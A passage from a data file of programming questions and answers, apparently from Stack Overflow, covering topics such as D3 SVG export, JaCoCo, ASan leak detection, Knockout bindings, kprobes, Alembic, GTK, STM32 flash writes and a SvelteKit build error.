",java
how do i saveexport an svg file after creating an svg with d3js ie safari and chrome,"I currently have a website using D3 and I'd like the user to have the option to save the SVG as an SVG file. I'm using crowbar.js to do this, but it only works on chrome. Nothing happens of safari and IE gives an access denied on the click() method used in crowbar.js to download the file.
var e = document.createElement('script'); 

if (window.location.protocol === 'https:') { 
    e.setAttribute('src', 'https://raw.github.com/NYTimes/svg-crowbar/gh-pages/svg-crowbar.js'); 
} else { 
    e.setAttribute('src', 'http://nytimes.github.com/svg-crowbar/svg-crowbar.js'); 
}

e.setAttribute('class', 'svg-crowbar'); 
document.body.appendChild(e);

How do I download an SVG file based on the SVG element on my website in safari, IE and chrome?
","There are 5 steps. I often use this method to output inline svg.

get inline svg element to output.
get svg source by XMLSerializer.
add name spaces of svg and xlink.
construct url data scheme of svg by encodeURIComponent method.
set this url to href attribute of some ""a"" element, and right click this link to download svg file.


//get svg element.
var svg = document.getElementById(""svg"");

//get svg source.
var serializer = new XMLSerializer();
var source = serializer.serializeToString(svg);

//add name spaces.
if(!source.match(/^<svg[^>]+xmlns=""http\:\/\/www\.w3\.org\/2000\/svg""/)){
    source = source.replace(/^<svg/, '<svg xmlns=""http://www.w3.org/2000/svg""');
}
if(!source.match(/^<svg[^>]+""http\:\/\/www\.w3\.org\/1999\/xlink""/)){
    source = source.replace(/^<svg/, '<svg xmlns:xlink=""http://www.w3.org/1999/xlink""');
}

//add xml declaration
source = '<?xml version=""1.0"" standalone=""no""?>\r\n' + source;

//convert svg source to URI data scheme.
var url = ""data:image/svg+xml;charset=utf-8,""+encodeURIComponent(source);

//set url value to a element's href attribute.
document.getElementById(""link"").href = url;
//you can download svg file by right click menu.

",javascript
jacoco and missed coverage of private default constructor,"I'd like to see an example to prevent JaCoCo to report private empty constructors as non-covered code in a Java class.
In the maven plugin configuration I have
   <rule>
     <element>CLASS</element>
       <excludes>
         <exclude>JAVAC.SYNTHCLASS</exclude>
         <exclude>JAVAC.SYNTHMETH</exclude>
       </excludes>
     </element>
   </rule>

Isn't there something similar for the constructor?
","This is not supported. The official documentation says: 

Filters for Code where Test Execution is Questionable or Impossible by Design

Private, empty default constructors - assuming no calls to it
Plain getters and setters
Blocks that throw AssertionErrors - Entire block should be ignored if a condition (if !assertion throw new AssertionError)


see also : https://github.com/jacoco/jacoco/issues/298
Update: This was fixed in https://github.com/jacoco/jacoco/pull/529 and should be in 0.8.0.
",java
assign value to paragraph or p tag through jquery for the data obtained from php,"I need to set the text of Paragraph or P tag to the value obtained though AJAX.
So I have the HTML page somewhat like this where I have declared the paragraph tab.
<p class=""card-text"">Client Type<p id=""Client_Type"" name = ""Client_Type""></p></p>

Onclick of the button I am making the AJAX call to HOME_CARD.PHP page.
The PHP is working properly and its returning me the data to jQuery. When I use console.log(data); it displays me all the data correctly.
$.ajax({
  url: ""Home_Card.php"",
  method: ""POST"",
  data: {
    search_client_id: search_client_id
  },
  success: function(data) {
    console.log(data);
    $('#Client_Type').val(data.CLIENT_MNEMONIC);
    //$('#Client_Type').text(""HELLO"");
    //$('#Client_Type').attr(data.CLIENT_MNEMONIC);
    //$('#card').show();
    //$('#Client_Type').(""HELLOE"");
  }
});

So I tried using val function to assign the value in CLIENT_TYPE to p tag in HTML page but its not assigning. When I use $('#Client_Type').text(""HELLO""); it assigns the value ""HELLO"" properly so I am guessing nothing wrong with my program.
I wanted to know is there any other way of assigning the value to paragraph tag in jQuery?
How to assign the specific value obtained from PHP in JSON format to paragraph p tag using jQuery.
","During the AJAX call, I did not mention the type of data I getting in return:
datatype: ""json"",
 $.ajax({
  url: ""Home_Card.php"",
  method: ""POST"",
datatype: ""json"",

  data: {
    search_client_id: search_client_id
  },
  success: function(data) {
    console.log(data);
    $('#Client_Type').val(data.CLIENT_MNEMONIC);
    //$('#Client_Type').text(""HELLO"");
    //$('#Client_Type').attr(data.CLIENT_MNEMONIC);
    //$('#card').show();
    //$('#Client_Type').(""HELLOE"");
  }
});

",javascript
why clang39s sanitizer doesn39t report memory leaks for global scope variables,"I have the following code:
#include <stdlib.h>
#include <stdio.h>

int main() {
    void* a = malloc(10);
    printf(""%p\n"", a);
}

When compiled and run:
clang-19 -std=c23 -fsanitize=address -g -Weverything -o test_mem.exe test_mem.c
./test_mem.exe
0x502000000010

=================================================================
==212167==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 10 byte(s) in 1 object(s) allocated from:
    #0 0x55f0442625cf in malloc (/home/xxx/xxx/xxx/test_mem.exe+0xcb5cf) (BuildId: fe83f3b1cd62d6171e5d431d34ee529cce48f18f)
    #1 0x55f0442a2a68 in main /xxx/xxx/xxx/xxx/test_mem.c:8:11
    #2 0x7fa09f96fd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: 10 byte(s) leaked in 1 allocation(s).

The memory leak is detected. Great!
However, if I change the code to:
#include <stdio.h>
#include <stdlib.h>

void* a = nullptr;

int main() {
    a = malloc(10);
    printf(""%p\n"", a);
}

and compile/run:
clang-19 -std=c23 -fsanitize=address -g -Weverything -o test_mem.exe test_mem.c
... compiler complains about `int* a` not being static, fine...
./test_mem.exe
0x502000000010

No memory leak is detected. Making the int* a static does not change this behavior (the compiler just reports it as a warning).
I am sure there's a ""good reason"" why the memory leak is not reported when the variable is declared globally, but:

Why is this the case? Is there a specific reason for this behavior? Could it be that when a variable is declared at the global scope, its memory is automatically freed, even when dynamically allocated? If this is the case, does it mean freeing that memory, like doing a free(a) isn't strictly necessary?

Is there a way to configure the sanitizer or compiler to detect such memory leaks for global variables? Some flags, perhaps?


","A memory leak occurs when all pointers to a block of allocated memory are lost before the lifetime of that block ends, i.e. before the pointer is passed to free.
If such a pointer is stored in a global variable, or more accurately a variable at file scope whose lifetime is that of the entire program, then that pointer to allocated memory is never lost for the life of the program, so no memory leak.
Tools like valgrind (which check behavior at run time) will note something like this, stating that the allocated memory is ""still reachable"" as opposed to leaked.
The valgrind output for this code is as follows:
==14636== Memcheck, a memory error detector
==14636== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==14636== Using Valgrind-3.15.0 and LibVEX; rerun with -h for copyright info
==14636== Command: ./x1
==14636== 
0x5205040
==14636== 
==14636== HEAP SUMMARY:
==14636==     in use at exit: 10 bytes in 1 blocks
==14636==   total heap usage: 1 allocs, 0 frees, 10 bytes allocated
==14636== 
==14636== LEAK SUMMARY:
==14636==    definitely lost: 0 bytes in 0 blocks
==14636==    indirectly lost: 0 bytes in 0 blocks
==14636==      possibly lost: 0 bytes in 0 blocks
==14636==    still reachable: 10 bytes in 1 blocks
==14636==         suppressed: 0 bytes in 0 blocks
==14636== Rerun with --leak-check=full to see details of leaked memory
==14636== 
==14636== For lists of detected and suppressed errors, rerun with: -s
==14636== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)

",c
with gcc how do i export only certain functions in a static library,"I've created a static library in GCC, but I'd like to hide most of the symbols.
For example, test1.c:
extern void test2(void);
void test1(void) {
  printf(""test1: "");
  test2();
}

test2.c:
extern void test1(void);
void test2(void) {
  printf(""test2\n"");
}

library_api.c:
extern void test1(void);
extern void test2(void);
void library_api(void) {
  test1();
  test2();
}

Now compile with:
gcc -c test1.c -o test1.o
gcc -c test2.c -o test2.o
gcc -c library_api.c -o library_api.o
ar rcs libapi.a test1.o test2.o library_api.o

How do I get only the ""library_api()"" function to show up for:
nm libapi.a

instead of the functions ""test1()"", ""test2()"", and ""library_api()""?  In other words, how do I hide ""test1()"" and ""test2()"" from showing up and being callable to external users of libapi.a?  I don't want external users to know anything about internal test functions.
","The simplest solution is to #include test1.c and test2.c into library_api.c, and only compile that file. Then you can make test1() and test2() static.
Alternatively, you can combine the object files with ld -r, and use objcopy --localize-symbols to make the test functions static after linking. As this can get fairly tedious, I really recommend the first option, though.
",c
knockout javascript radiobutton setting value programmatically,"I have a custom control with the following code. I expect ""Option 1"" to be selected on page reload. But nothing is selected. But I can manually select either options.
Initially the output is
Element value = on, Observable value = abc

But after manually selecting the radio button,
Change event: Setting observable to abc
Change event: Setting observable to def
Update: Element value = abc, Observable value = def
Update: Element value = def, Observable value = def
Change event: Setting observable to def
Change event: Setting observable to abc
Update: Element value = abc, Observable value = abc
Change event: Setting observable to abc
Update: Element value = def, Observable value = abc

What is wrong is setting the initial value of the radio button?


this.tempitems = ko.observableArray([{
    guid: ""abc"",
    name: ""Option 1""
  },
  {
    guid: ""def"",
    name: ""Option 2""
  }
]);

this.tempitem = ko.observable(""def""); // Initially selects ""Option 2""
this.tempitem = ko.observable(""abc"");
console.log(""Initial value of tempitem:"", ko.unwrap(self.tempitem));

ko.bindingHandlers.rbChecked = {
  init: function(element, valueAccessor, allBindingsAccessor,
    viewModel, bindingContext) {
    var value = valueAccessor();

    // Handle the change event
    ko.utils.registerEventHandler(element, ""change"", function() {
      console.log(`Change event: Setting observable to ${element.value}`);
      value(element.value); // Update the observable
    });

    // Set the initial checked state
    if (ko.unwrap(value) === element.value) {
      console.log(""Init: Setting element.checked = true"");
      element.checked = true;
    }

    var newValueAccessor = function() {
      return {
        change: function() {
          value(element.value);
        }
      }
    };

    ko.bindingHandlers.event.init(element, newValueAccessor, allBindingsAccessor, viewModel, bindingContext);

    if (value != undefined && $(element).val() == value()) {
      setTimeout(function() {
        var toggle = $(element).closest('.btn-toggle');
        $(toggle).children('.btn').removeClass('active');
        $(toggle).children('.btn').removeClass('btn-primary');
        $(toggle).children('.btn').addClass('btn-default');

        var btn = $(element).closest('.btn');
        $(btn).addClass('btn-primary');
        $(btn).addClass('active');


      }, 0);
    }
  },
  update: function(element, valueAccessor, allBindingsAccessor,
    viewModel, bindingContext) {
    const value = ko.unwrap(valueAccessor());
    console.log(`Update: Element value = ${element.value}, Observable value = ${value}`);

    // Ensure the checked state reflects the observable value
    element.checked = value === element.value;

    // If the radio button is checked, trigger the change event to update the observable
    if (element.checked) {
      element.dispatchEvent(new Event(""change"", {
        bubbles: true
      }));
    }

    if ($(element).val() == ko.unwrap(valueAccessor())) {

      setTimeout(function() {
        $(element).closest('.btn').toggleClass('active');

        var toggle = $(element).closest('.btn-toggle');
        $(toggle).children('.btn').removeClass('active');
        $(toggle).children('.btn').removeClass('btn-primary');
        $(toggle).children('.btn').addClass('btn-default');

        var btn = $(element).closest('.btn');
        $(btn).addClass('btn-primary');
        $(btn).addClass('active');

      }, 0);

    }
  }
};
<script src=""https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.1/knockout-latest.min.js""></script>
<ul class=""list-group"" data-bind=""foreach: tempitems"">
  <li>
    <input class=""form-checkbox""
                   type=""radio""
                   name=""target""
                   data-bind=""attr: { 'id': guid }, rbChecked: $parent.tempitem, value: guid"" />
    <span data-bind=""text: name""></span>
    <span data-bind=""text: $parent.tempitem""></span>
  </li>
</ul>



","Only initialise tempitem once with the desired initial value and avoid feedback loops by only updating the observable when the user interacts with the radio button. Don't dispatch change events in the update method.
Let Knockout handle the synchronization of the checked state instead of directly manipulating element.checked.
Here the rbChecked binding uses Knockout for the two-way binding to avoid unnecessary DOM access.
I also had to data-bind the value so it is ""abc"" instead of ""on""


ko.bindingHandlers.rbChecked = {
  init: function(element, valueAccessor) {
    const value = valueAccessor();

    // Change event is triggered by user interaction
    ko.utils.registerEventHandler(element, ""change"", function() {
      console.log(`Change event: Setting observable to ${element.value}`);
      value(element.value); // Update the observable
    });
    if (ko.unwrap(value) === element.value) {
      console.log(`Init: Setting element.checked = true for value ${element.value}`);
      element.checked = true;
    }
  },
  update: function(element, valueAccessor) {
    const value = ko.unwrap(valueAccessor());

    console.log(`Update: Element value = ${element.value}, Observable value = ${value}`);

    // Synchronize the checked state with the observable
    element.checked = value === element.value;
  },
};

// ViewModel
function ViewModel() {
  const self = this;

  self.tempitems = ko.observableArray([{
      guid: ""abc"",
      name: ""Option 1""
    },
    {
      guid: ""def"",
      name: ""Option 2""
    },
  ]);

  self.tempitem = ko.observable(""abc""); // Initially selects ""Option 1""

  console.log(""Initial value of tempitem:"", ko.unwrap(self.tempitem));
}

ko.applyBindings(new ViewModel());
<script src=""https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.1/knockout-latest.min.js""></script>
<ul class=""list-group"" data-bind=""foreach: tempitems"">
  <li>
    <input
      class=""form-checkbox""
      type=""radio""
      name=""target""
      data-bind=""attr: { id: guid, value: guid }, rbChecked: $parent.tempitem""
    />
    <span data-bind=""text: name""></span>
  </li>
</ul>
<p>Selected Value: <span data-bind=""text: tempitem""></span></p>



",javascript
access to the sys_call_table in kernel 26,"Is there a possibility to access the sys_call_table from my own module for Linux kernel 2.6+?
What are some links to articles or how-tos? I need a method without the necessity to modify the kernel source code. I know it was easy on the Linux 2.4 kernel, and you could use the external symbol. However, this ability was removed from kernel 2.6.
","As what you are really trying to do is replace a system call by your own function, I would recommend using kprobes for this kind of job, you can easily break on any kernel address (or symbol (e.g., sys_exit and sys_whateversyscall) and alter the execution path, all of this at runtime, with a kernel module if you need to :) It has a very low overhead.
Kprobes (or jprobes if you only to add your code to the system call as opposed to replace it completely) work by dynamically replacing an instruction (e.g. first instruction of your system call entry) by a break (e.g., int3 on x86). Inside the do_int3 handler, a notifier notifies kprobes, which in turn passes the execution to your registered function, from which point you can do almost anything.
A very good documentation is given in Documentation/kprobes.txt so as a tiny example in file samples/kprobes/kprobes_example.c (in this example, they break on do_fork to log each fork on the system). It has a very simple API and is very portable nowadays.
",c
how to get alembic to recognise sqlmodel database model,"Using SQLModel how to get alembic to recognise the below model?
from sqlmodel import Field, SQLModel

class Hero(SQLModel, table=True):
    id: int = Field(default=None, primary_key=True)
    name: str
    secret_name: str
    age: Optional[int] = None

One approach I've been looking at is to import the SQLalchemy model for Alembic but looking through the source code I can't find how to do that.
How to make Alembic work with SQLModel models?
","There should be info about that in Advanced user guide soon with better explanation than mine but here is how I made Alimbic migrations work.
First of all run alembic init migrations in your console to generate migrations folder. Inside migrations folder should be empty versions subfolder,env.py file, script.py.mako file.
In script.py.mako file we should add line import sqlmodel somewhere around these two lines
#script.py.mako
from alembic import op
import sqlalchemy as sa
import sqlmodel # added

Then we should edit env.py file
#env.py
from logging.config import fileConfig

from sqlalchemy import engine_from_config
from sqlalchemy import pool

from alembic import context

from app.models import * # necessarily to import something from file where your models are stored

# this is the Alembic Config object, which provides
# access to the values within the .ini file in use.
config = context.config

# Interpret the config file for Python logging.
# This line sets up loggers basically.
fileConfig(config.config_file_name)

# add your model's MetaData object here
# for 'autogenerate' support
# from myapp import mymodel
# target_metadata = mymodel.Base.metadata
target_metadata = None 
# comment line above and instead of that write
target_metadata = SQLModel.metadata

While writing came up with an idea that you forgot to import something from your models.py (or anywhere else your models are stored). And that was the main problem
Also, an important note would be saving changes in your models by pressing ctrl(CMD) + S - there are some issues with that.
Finally,running
 alembic revision --autogenerate -m ""your message""

should generate a new .py file in versions folder with your changes.
And
 alembic upgrade head  

Applies your changes to DB.
",python
extract html page variable from scripttag in javascript,"How can I extract a variable from a script tag of the page from a returned HTML Page in Javasc./Typescript?
My API request to the Server:
const response = await fetch( ... )
The response contains a big HTML Page, here just an example:


<h1>Willkommen auf der Seite für Steam App Daten</h1>

<script type=""text/javascript"">
  var g_rgAppContextData = {
    ""730"": {
      ""appid"": 730,
      ""name"": ""Counter-Strike 2"",
      ""icon"": ""https://cdn.fastly.steamstatic.com/steamcommunity/public/images/apps/730/8dbc71957312bbd3baea65848b545be9eae2a355.jpg"",
      ""link"": ""https://steamcommunity.com/app/730""
    }
  };
  var g_rgCurrency = [];
</script>



I only want to extract the Variable g_rgAppContextData without anything else. I know, that i can select the script tag with getElementsByTagName(""script"") but what if there are 2 script tags? And how to select only the Variable?
","Since the pages you want to scrape follow a certain pattern, it seems possible to make a number of simplifying assumptions about the structure of the returned HTML:

The desired variable is assigned a constant value in JSON format (in particular, member names like ""730"" are quoted).
The HTML page contains only one assignment for this variable.
A semicolon follows immediately after the closing }.
The member names and string values do not contain the sequence };.

Let me know if these assumptions are not justified in your case.
Under these assumptions, you can extract the variable value with a regular expression and parse it as JSON:
const response = await fetch(""..."");
const html = await response.text();
const g_rgAppContextData = JSON.parse(
  html.match(/g_rgAppContextData\s*=\s*(\{.*?\});/s)[1]
);

",javascript
how does c compare to llvm,"After learning a bit of how LLVM work I'm really excited about how portable low-level code can be generated and how modular this 'thing' is built.
But I discovered today the existence of C-- that seems to share some concepts with LLVM.
So I'm looking for some information helping me understand the main differences between these two projects... and why both exist.
For me LLVM looks a bit like the ultimate Swiss Army knife for compiler infrastructure, and C-- looks far less advanced.
","They differ in how expressive the low level machine type system is.
The LLVM machine is pretty expressive. The C-- machine on the other hand, puts a lot of responsibility on the language front end. Quoting from the C-- FAQ:  ""simply, C-- has no high-level types---it does not even distinguish floating-point variables from integer variables. This model gives the front end total control of representation and type system""
Also visually they look a lot different. C-- looks a lot like C, LLVM looks a lot like assembler.
Pragmatically, LLVM has a lot more momentum right now. It has a JIT compiler, Apple is using it for 3D pipeline things and people are using it to connect to GCC and all sorts of weird and wonderful things. Someone called it ""almost absurdly easy to work with"".
On the other hand C-- is much smaller and probably easier to entirely comprehend. (I imagine a normal person with some dedication can fully understand all aspects of it.)
",c
stop a cpuintensive operation by pressing a gtk button,"I'm extending a GTK-application that does a group of operations that takes high CPU loads. I want to include the possibility to stop this operation by clicking on a button in the GUI.
The problem is that, as expected, the signal coming from the button is actually fired just after the operation is completed.
For now, the code kinda looks like this:
[...]
// code snippet to show the dialog and to enable user interactions with the buttons on the lower side of the window
while(TRUE) {
    gint run = gtk_dialog_run (window_main);
    if (run == GTK_RESPONSE_APPLY) {
        gboolean success = start_long_operation();
    }
    else if (run == GTK_RESPONSE_HELP) {
        open_about();
    }
    else if (run == GTK_RESPONSE_CANCEL) {
        stop_long_operation();
    }
    else {
        gtk_widget_destroy (window_main);
        return;
    }
}

I've declared a global variable busy_state that is checked by the long operation's function: if it is TRUE, simply the inner loop continues to cycle. Else, the loop exits and the function returns a result.
stop_long_operation() simply sets this global var to FALSE.
As written before, I can't press the ""stop"" button and ""send"" GTK_RESPONSE_CANCEL until the operation finishes, because it blocks the entire window.
I've tried the use of while (g_main_context_iteration(NULL, FALSE)) trick inside the stop_long_operation() function, as explained in the gtk's docs, but without results.
Do I really need to set up a multithread functionality? Can I avoid this?
Thanks for the help.
","If you can break up your long operation into multiple smaller tasks you may be able to avoid using threads.  The easiest way would be to just create a callback that you would pass to g_idle_add (or g_idle_add_full).  Each time the callback runs it does a small amount of work, then returns TRUE.  When the the task is completed, return FALSE and the callback not be run again.  When you would like to interrupt the task, simply remove the callback by passing the value returned by g_idle_add to g_source_remove.
If you can't break up the operation then threads are pretty much your only choice.  g_thread_new is the low-level way to do that, but it's generally easier to use a GThreadPool.  A more advanced option would be to use g_simple_async_result_run_in_thread.
",c
hardfault writing struct to stm32h7 flash using stm32 hal driver,"--Updated, see below--
I'm trying to write a struct of size around 680 bytes to Sector 1, Bank 2 of the flash in an STM32H757XIH6. I'm pretty new to this kind of thing so I'm slowly building on the code.
I'm using the STM32 HAL driver.
The address of this sector is 0x08100000.
Here's the code:
typedef struct {
    uint32_t data_header;
    Parameter parameter[NUMBER_PARAMETERS];
    int screen_paras[MAX_SCREENS][MAX_WIDGETS];
} Persistent_data;


void save_data() {
    Persistent_data save_data;

    uint32_t data_header = DATA_HEADER;

    save_data.data_header = data_header;
    memcpy(save_data.parameter, parameter, sizeof(save_data.parameter));
    memcpy(save_data.screen_paras, screen_paras, sizeof(save_data.screen_paras));

    size_t size = sizeof(Persistent_data);
    uint32_t word_count = (size + 3) / 4; //32bit alignment
    Flash_Write(FLASH_START_ADDRESS, (uint32_t*)&save_data, word_count);
    }


HAL_StatusTypeDef Flash_Write(uint32_t address, uint32_t* data, uint32_t length) {
    HAL_StatusTypeDef status = HAL_OK;

    // Ensure address is within the flash range
    if (address < FLASH_USER_START_ADDR || (address + length) > FLASH_USER_END_ADDR) {
        return HAL_ERROR;
        }

    // Unlock the Flash
    HAL_FLASH_Unlock();

    // Erase the flash sector
    FLASH_EraseInitTypeDef eraseInitStruct = {
        .TypeErase = FLASH_TYPEERASE_SECTORS,
        .Banks = FLASH_BANK_2,
        .Sector = FLASH_SECTOR_1,
        .NbSectors = 1,
        .VoltageRange = FLASH_VOLTAGE_RANGE_3,
        };
    uint32_t sectorError = 0;

    status = HAL_FLASHEx_Erase(&eraseInitStruct, &sectorError);
    if (status != HAL_OK) {
        HAL_FLASH_Lock();
        return status;
        }

    // Write the data
     for (int i = 0; i < length / 4; i++) { // Writing 32-bit words
        status = HAL_FLASH_Program(FLASH_TYPEPROGRAM_FLASHWORD, address, data[i]);
        if (status != HAL_OK) {
            break;
            }
        address += 4; // Increment address by 4 bytes (32 bits)
        }

    // Lock the Flash
    HAL_FLASH_Lock();
    return status;
    }


When I try to save the save_data (with all it's members) a hard fault is generated from the line status = HAL_FLASH_Program(FLASH_TYPEPROGRAM_FLASHWORD, address, data[i]);
Tracing it further it gets to *dest_addr = *src_addr; in stm32h7xx_hal_flash.c.
From there I'm not sure how to interpret the crash stack, next is <signal handler called>() at 0xffffffed
ffffffed:   Failed to execute MI command:
          -data-disassemble -s 4294967277 -e 4294967529 -- 3
          Error message from debugger back end:
          Cannot access memory at address 0xffffffec

Please let me know if I can provide any more info
-----Update 1:----
I have updated the code to suit the 256-bit/32-byte word as suggested. New code snippets:
typedef struct {
    uint32_t data_header;
    Parameter parameter[NUMBER_PARAMETERS];
    int screen_paras[MAX_SCREENS][MAX_WIDGETS];
} Persistent_data;

void save_data() {
    Persistent_data save_data;

    uint32_t data_header = DATA_HEADER;

    save_data.data_header = data_header;
    memcpy(save_data.parameter, parameter, sizeof(save_data.parameter));
    memcpy(save_data.screen_paras, screen_paras, sizeof(save_data.screen_paras));

    size_t size = sizeof(Persistent_data);
    uint32_t word_count = (size + 31) / 32; //32bit alignment
    Flash_Write(FLASH_START_ADDRESS, (uint32_t*)&save_data, word_count);
    }

void load_data() {

    Persistent_data load_data;
    size_t size = sizeof(Persistent_data);
    uint32_t word_count = (size + 31) / 32; //align
    Flash_Read(FLASH_START_ADDRESS, (uint32_t*)&load_data, word_count);

    if (load_data.data_header == DATA_HEADER) {
        memcpy(parameter, load_data.parameter, sizeof(parameter));
        memcpy(screen_paras, load_data.screen_paras, sizeof(screen_paras));
        }
}

HAL_StatusTypeDef Flash_Write(uint32_t address, uint32_t* data, uint32_t length) {
    HAL_StatusTypeDef status = HAL_OK;

    // Ensure address is within the flash range
    if (address < FLASH_USER_START_ADDR || (address + length) > FLASH_USER_END_ADDR) {
        return HAL_ERROR;
        }

    // Unlock the Flash
    HAL_FLASH_Unlock();

    // Erase the flash sector
    FLASH_EraseInitTypeDef eraseInitStruct = {
        .TypeErase = FLASH_TYPEERASE_SECTORS,
        .Banks = FLASH_BANK_2,
        .Sector = FLASH_SECTOR_1,
        .NbSectors = 1,
        .VoltageRange = FLASH_VOLTAGE_RANGE_3,
        };
    uint32_t sectorError = 0;

    status = HAL_FLASHEx_Erase(&eraseInitStruct, &sectorError);
    if (status != HAL_OK) {
        HAL_FLASH_Lock();
        return status;
        }


    //Write the data
     for (int i = 0; i < length / 32; i++) { // Writing 32-byte (256 bit) words
        status = HAL_FLASH_Program(FLASH_TYPEPROGRAM_FLASHWORD, address, (uint32_t)&data[i * 8]);
        if (status != HAL_OK) {
            break;
            }
        address += 32; // Increment address by 32 bytes (256 bits)
        }


    // Lock the Flash
    HAL_FLASH_Lock();
    return status;
    }

/**
 * @brief Read data from flash memory
 * @param address Start address to read (must be 256-bit aligned)
 * @param data Pointer to the buffer to store the read data
 * @param length Number of bytes to read (must be a multiple of 32)
 */
void Flash_Read(uint32_t address, uint32_t* data, uint32_t length) {
    if (address < FLASH_USER_START_ADDR || (address + length) > FLASH_USER_END_ADDR) {
        return; // Out of bounds
    }

    for (uint32_t i = 0; i < length / 32; i++) { // Reading 32-byte (256-bit) words
        // Read 32 bytes (256 bits) from flash starting at the given address
        for (uint32_t j = 0; j < 8; j++) {
            data[i * 8 + j] = *(__IO uint32_t*)(address + j * 4); // 4 bytes per uint32_t word
        }
        address += 32; // Increment address by 32 bytes (256 bits)
    }
}

New problem: When I read the data back, it isn't correct. The data_header doesn't match. There's data there, but none of it is right. Could it be something to do with the way I've referenced/used pointers? Or the way the memory is iterated over?
","I think the issue may be that you are attempting to write in overlapping regions, which is prohibited per this post. Do you know which write is failing? Is it your first write or the second write?
You are incrementing the address by 4 bytes when you should be incrementing by 32 bytes, since you are writing in chunks of ""FLASH_TYPEPROGRAM_FLASHWORD"". See this post or this other post which are bumping the write offsets by 32 bytes on each write.
This post defines a ""WORD"" as 4 bytes but the H7 Series post I linked previously has this:
// If using any other STM32H7 Series, uncomment the line below
#define FLASHWORD       8

Indicating some devices define a WORD as 8 bytes, strangely enough.
You could try writing in smaller chunks such as FLASH_TYPEPROGRAM_BYTE if your device permits such an operation.
",c
how to avoid if statement for the compiler cannot optimize it to simd,"In vs2012 the compiler can automatically optimize the for loop into SIMD assembly statement.
But when a if statment is in the for loop, the compiler cannot optimize it,
just like:
for(int i=0; i<10000; i++)
{
    if(a[i]<1)
    {
        a[i]=0;
    }
}

Is there anyway to replace the if statments and let the compiler able to automatically optimize
it into simd code?
","Well, you could try trickery like:
for(int i=0; i<10000; i++)
    a[i] = a[i] * (a[i] >= 1);

but you should realise a few things.
First, it may end up still not being able to use SIMD. That'll depend on the compiler and how clever it may be.
Secondly, it may end up being slower, especially since you're performing a calculation on, and touching, every element in the array. This won't be too bad for the sample but, if your calculation is more complex, that can cause trouble.
Thirdly, if that is your real code, SIMD isn't really going to help that much for a simple calculation and minimal loop count (10,000 isn't really that much).
",c
sveltekit packages not being able to access node functions,"I am building an app with SvelteKit and publishing it to Cloudflare Pages, but it is some packages I am using are not able to access node native functions. Here's the build log:
2022-07-30T19:05:14.200499Z > Using @sveltejs/adapter-cloudflare
2022-07-30T19:05:14.227308Z ✘ [ERROR] Could not resolve ""url""
2022-07-30T19:05:14.227701Z 
2022-07-30T19:05:14.227859Z     node_modules/sequelize/lib/sequelize.js:21:20:
2022-07-30T19:05:14.228009Z       21 │ const url = require(""url"");
2022-07-30T19:05:14.22817Z           ╵                     ~~~~~
2022-07-30T19:05:14.228388Z 
2022-07-30T19:05:14.228525Z   The package ""url"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.228694Z 
2022-07-30T19:05:14.22885Z  ✘ [ERROR] Could not resolve ""path""
2022-07-30T19:05:14.229004Z 
2022-07-30T19:05:14.229168Z     node_modules/sequelize/lib/sequelize.js:22:21:
2022-07-30T19:05:14.22932Z        22 │ const path = require(""path"");
2022-07-30T19:05:14.229452Z          ╵                      ~~~~~~
2022-07-30T19:05:14.229593Z 
2022-07-30T19:05:14.229733Z   The package ""path"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.229891Z 
2022-07-30T19:05:14.241501Z ✘ [ERROR] Could not resolve ""@firebase/database-compat/standalone""
2022-07-30T19:05:14.2417Z   
2022-07-30T19:05:14.241833Z     node_modules/firebase-admin/lib/app/firebase-namespace.js:106:41:
2022-07-30T19:05:14.242066Z       106 │ ...ject.assign(fn, require('@firebase/database-compat/standalone'));
2022-07-30T19:05:14.242206Z           ╵                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
2022-07-30T19:05:14.242323Z 
2022-07-30T19:05:14.242435Z   The path ""./standalone"" is not currently exported by package ""@firebase/database-compat"":
2022-07-30T19:05:14.242596Z 
2022-07-30T19:05:14.243619Z     node_modules/@firebase/database-compat/package.json:16:13:
2022-07-30T19:05:14.244219Z       16 │   ""exports"": {
2022-07-30T19:05:14.244437Z          ╵              ^
2022-07-30T19:05:14.244574Z 
2022-07-30T19:05:14.244698Z   None of the conditions provided (""types"", ""node"") match any of the currently active conditions (""browser"", ""default"", ""require""):
2022-07-30T19:05:14.24483Z  
2022-07-30T19:05:14.244956Z     node_modules/@firebase/database-compat/package.json:27:20:
2022-07-30T19:05:14.24507Z        27 │     ""./standalone"": {
2022-07-30T19:05:14.245196Z          ╵                     ^
2022-07-30T19:05:14.245368Z 
2022-07-30T19:05:14.2455Z     Consider enabling the ""types"" condition if this package expects it to be enabled. You can use ""conditions: ['types']"" to do that:
2022-07-30T19:05:14.245626Z 
2022-07-30T19:05:14.245736Z     node_modules/@firebase/database-compat/package.json:28:6:
2022-07-30T19:05:14.245847Z       28 │       ""types"": ""./dist/database-compat/src/index.standalone.d.ts"",
2022-07-30T19:05:14.245969Z          ╵       ~~~~~~~
2022-07-30T19:05:14.24608Z  
2022-07-30T19:05:14.246397Z   You can mark the path ""@firebase/database-compat/standalone"" as external to exclude it from the bundle, which will remove this error. You can also surround this ""require"" call with a try/catch block to handle this failure at run-time instead of bundle-time.
2022-07-30T19:05:14.246547Z 
2022-07-30T19:05:14.282052Z ✘ [ERROR] Could not resolve ""util""
2022-07-30T19:05:14.282324Z 
2022-07-30T19:05:14.282497Z     node_modules/retry-as-promised/index.js:3:19:
2022-07-30T19:05:14.282669Z       3 │ var util = require('util');
2022-07-30T19:05:14.282834Z         ╵                    ~~~~~~
2022-07-30T19:05:14.282992Z 
2022-07-30T19:05:14.28312Z    The package ""util"" wasn't found on the file system but is built into node. Are you trying to bundle for node? You can use ""platform: 'node'"" to do that, which will remove this error.
2022-07-30T19:05:14.283505Z 
2022-07-30T19:05:14.317451Z ✘ [ERROR] Could not resolve ""url""
2022-07-30T19:05:14.317714Z 
2022-07-30T19:05:14.317856Z     node_modules/pg-connection-string/index.js:3:18:
